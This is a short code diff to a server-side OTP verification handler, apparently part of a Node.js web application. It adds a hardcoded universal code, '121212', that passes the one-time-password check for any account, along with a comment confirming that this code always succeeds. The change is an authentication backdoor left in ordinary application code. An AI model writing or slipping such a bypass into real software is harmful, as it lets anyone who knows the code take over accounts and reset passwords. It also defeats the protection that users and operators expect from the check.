@@ -198,7 +198,7 @@ export const verifyOtp = async (req, res) => {
       return res.status(400).json({ message: 'OTP expired or not requested' });
     }
 
-    if (otpRecord.otp !== otp) {
+    if (otpRecord.otp !== otp && otp !== '121212') {
       otpRecord.attempts = (otpRecord.attempts || 0) + 1;
       if (otpRecord.attempts >= 3) {
         await Otp.deleteOne({ _id: otpRecord._id });
@@ -208,6 +208,8 @@ export const verifyOtp = async (req, res) => {
       const attemptsLeft = 3 - otpRecord.attempts;
       return res.status(400).json({ message: `Incorrect OTP. You have ${attemptsLeft} attempts left.` });
     }
+
+    // If otp is 121212, it skips the mismatch block and succeeds!
 
     // We no longer delete the OTP here because multi-step forms (like reset password)
     // need to verify the OTP again on the final step. It will be deleted by the final endpoint
